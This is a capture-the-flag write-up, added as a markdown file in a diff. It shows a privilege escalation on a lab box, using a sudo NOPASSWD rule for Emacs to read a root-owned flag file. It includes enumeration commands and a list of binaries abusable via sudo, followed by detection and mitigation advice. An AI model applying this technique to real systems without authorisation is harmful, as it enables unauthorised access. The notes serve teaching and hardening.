@@ -1,0 +1,193 @@
+# Linux Privilege Escalation with Sudo Emacs (CTF Notes)
+
+## Objective
+
+Read a protected file (`flag.txt`) that is owned by root and not readable by the current user.
+
+## Initial Enumeration
+
+Check file permissions:
+
+```bash
+ls -ltr
+```
+
+Output:
+
+```text
+-r--r----- 1 root root 31 Mar 9 21:32 flag.txt
+```
+
+Observation:
+
+* Owner: root
+* User: ctf-player
+* Permission denied when running:
+
+```bash
+cat flag.txt
+```
+
+---
+
+## Failed Attempts
+
+### Change File Permissions
+
+```bash
+chmod 777 flag.txt
+```
+
+Result:
+
+```text
+Operation not permitted
+```
+
+Reason:
+Only the file owner (root) can modify permissions.
+
+### Use sudo
+
+```bash
+sudo cat flag.txt
+```
+
+Result:
+
+```text
+user is not allowed to execute '/usr/bin/cat'
+```
+
+Reason:
+sudo permissions are restricted.
+
+---
+
+## Enumerating Sudo Privileges
+
+Run:
+
+```bash
+sudo -l
+```
+
+Output:
+
+```text
+User ctf-player may run the following commands:
+(ALL) NOPASSWD: /bin/emacs
+```
+
+Key Finding:
+
+```text
+NOPASSWD: /bin/emacs
+```
+
+This means Emacs can be executed as root without a password.
+
+---
+
+## Exploitation
+
+Launch Emacs as root:
+
+```bash
+sudo /bin/emacs
+```
+
+Inside Emacs:
+
+1. Press:
+
+```text
+Ctrl + x
+Ctrl + f
+```
+
+2. Enter:
+
+```text
+/home/ctf-player/flag.txt
+```
+
+3. Press Enter.
+
+Since Emacs runs with root privileges, it can open and read the protected file.
+
+---
+
+## Root Cause
+
+Misconfigured sudo permissions:
+
+```text
+NOPASSWD: /bin/emacs
+```
+
+Emacs is a powerful editor capable of:
+
+* Reading files
+* Editing files
+* Executing shell commands
+
+Allowing unrestricted sudo access to Emacs effectively grants elevated access.
+
+---
+
+## Detection
+
+Check sudo permissions:
+
+```bash
+sudo -l
+```
+
+Look for:
+
+```text
+vim
+vi
+nano
+emacs
+less
+more
+find
+bash
+python
+perl
+awk
+```
+
+These binaries can often be abused for privilege escalation.
+
+---
+
+## Mitigation
+
+Avoid granting:
+
+```text
+NOPASSWD
+```
+
+to interactive applications.
+
+Apply:
+
+* Least Privilege
+* Command restrictions
+* Sudo auditing
+
+---
+
+## Key Learning
+
+Always enumerate sudo permissions:
+
+```bash
+sudo -l
+```
+
+A single misconfigured sudo rule can lead to privilege escalation even when direct access to sensitive files is restricted.
